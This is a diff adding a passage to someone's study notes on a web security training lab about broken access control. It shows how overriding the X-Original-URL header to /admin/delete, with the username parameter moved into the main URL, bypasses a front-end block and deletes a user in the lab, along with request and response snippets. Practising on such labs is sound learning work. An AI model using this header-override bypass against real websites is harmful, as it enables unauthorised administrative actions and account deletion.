@@ -166,3 +166,34 @@ in response and knew immediately i had to change the `roleid:1` to `roleid:2`
 `"roleid":2`
 `}`
 ![[Pasted image 20260906005045.png]]
+
+
+
+#### Broken access control resulting from platform misconfiguration
+Lab 5:
+
+Change the URL in the request line to `/` and add the HTTP header `X-Original-URL: /invalid`
+`X-Original-URL: /admin`
+
+![[Pasted image 20260907112011.png]]![[Pasted image 20260907112216.png]]
+
+But it says access denied so I change the request to
+`X-Original-Url: /admin/delete?username=carlos`
+
+and get a response:
+
+`HTTP/2 400 Bad Request`
+`Content-Type: application/json; charset=utf-8`
+`X-Frame-Options: SAMEORIGIN`
+`Content-Length: 30`
+
+`"Missing parameter 'username'"`
+
+So we just add `?username=carlos` into  the main url
+
+`GET /?username=carlos HTTP/2`
+`Host: 0ae700e1030141168026a81e00db0046.web-security-academy.net`
+`X-Original-Url: /admin/delete`
+
+And send to follow the redirection
+![[Pasted image 20260907114821.png]]
